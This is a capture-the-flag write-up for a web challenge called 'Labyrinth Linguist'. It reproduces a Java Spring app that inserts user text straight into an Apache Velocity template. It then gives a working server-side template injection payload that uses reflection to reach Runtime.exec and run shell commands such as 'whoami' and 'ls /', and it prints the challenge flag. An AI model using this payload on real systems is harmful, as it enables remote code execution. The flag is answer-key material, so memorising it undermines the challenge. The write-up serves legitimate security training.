# Labyrinth Linguist

# Labyrinth Linguist

### Description

POINTS: 425\

\
DIFFICULTY: easy

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

### Solution


::: details main.java
```java
import java.io.*;
import java.util.HashMap;

import org.springframework.boot.*;
import org.springframework.boot.autoconfigure.*;
import org.springframework.stereotype.*;
import org.springframework.web.bind.annotation.*;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;

@Controller
@EnableAutoConfiguration
public class Main {

	@RequestMapping("/")
	@ResponseBody
	String index(@RequestParam(required = false, name = "text") String textString) {
		if (textString == null) {
			textString = "Example text";
		}

		String template = "";

        try {
            template = readFileToString("/app/src/main/resources/templates/index.html", textString);
        } catch (IOException e) {
            e.printStackTrace();
        }

		RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
		StringReader reader = new StringReader(template);

		org.apache.velocity.Template t = new org.apache.velocity.Template();
		t.setRuntimeServices(runtimeServices);
		try {

			t.setData(runtimeServices.parse(reader, "home"));
			t.initDocument();
			VelocityContext context = new VelocityContext();
			context.put("name", "World");

			StringWriter writer = new StringWriter();
			t.merge(context, writer);
			template = writer.toString();

		} catch (ParseException e) {
			e.printStackTrace();
		}

		return template;
	}

	public static String readFileToString(String filePath, String replacement) throws IOException {
        StringBuilder content = new StringBuilder();
        BufferedReader bufferedReader = null;

        try {
            bufferedReader = new BufferedReader(new FileReader(filePath));
            String line;
            
            while ((line = bufferedReader.readLine()) != null) {
                line = line.replace("TEXT", replacement);
                content.append(line);
                content.append("\n");
            }
        } finally {
            if (bufferedReader != null) {
                try {
                    bufferedReader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return content.toString();
    }

	public static void main(String[] args) throws Exception {
		System.getProperties().put("server.port", 1337);
		SpringApplication.run(Main.class, args);
	}
}
```
:::

When rendering from string and instead of template, the success of [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) grows.

From imports we see that [Velocity](https://velocity.apache.org/engine/1.7/user-guide.html) is being used and [Velocity SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java) exists.

For some reason payload by HackTricks didnt work, so I had to find a new one. I ended up with:

```java
#set($class="tmp")
#set($str=$class.getClass().forName("java.lang.String"))
#set($chr=$class.getClass().forName("java.lang.Character"))
#set($ex=$class.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#set($res="")
#foreach($i in [1..$out.available()])
	#set($char=$str.valueOf($chr.toChars($out.read())))	
	#set($res="$res$char")
#end

$res
```

Define `$class` to be used as base variable for other classes. Get String and Character classes to use methods later, execute command with `Runtime` class and read output of `exec`. In for loop Im concatinating output into one string and displaying, otherwise it would show vertical line output and that's pain.

URLEncode the payload and send.

::: info :information_source:
If command fails you'll get error
:::

Get listing of files: `ls /`

![labyrinth-linguist-1](/assets/ctf/htb/labyrinth-linguist-1.png)

Read flag:

![labyrinth-linguist-2](/assets/ctf/htb/labyrinth-linguist-2.png)

::: tip Flag
`HTB{f13ry\_t3mpl4t35\_fr0m\_th3\_d3pth5!!}`
:::
